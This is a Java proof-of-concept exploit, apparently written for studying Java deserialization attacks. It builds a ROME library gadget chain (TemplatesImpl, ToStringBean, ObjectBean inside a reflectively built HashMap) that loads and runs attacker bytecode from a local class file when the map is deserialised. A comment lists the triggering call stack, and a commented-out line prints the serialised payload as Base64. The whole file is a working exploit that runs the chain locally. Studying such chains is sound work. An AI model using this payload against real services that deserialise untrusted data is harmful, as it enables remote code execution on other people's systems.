package Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
/*
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)
 * hashCode:110, ObjectBean (com.sun.syndication.feed.impl)
 * hash:338, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 */
public class ObjectBeanC {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));


        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "whatever");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);


        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);


        HashMap<Object, Object> map = new HashMap<>();
        setFieldValue(map, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean, objectBean, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, "p", "p", null));
        setFieldValue(map, "table", tbl);
        setFieldValue(objectBean, "_cloneableBean", null);
        setFieldValue(objectBean, "_toStringBean", null);


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
//        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
//        ois.close();



    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
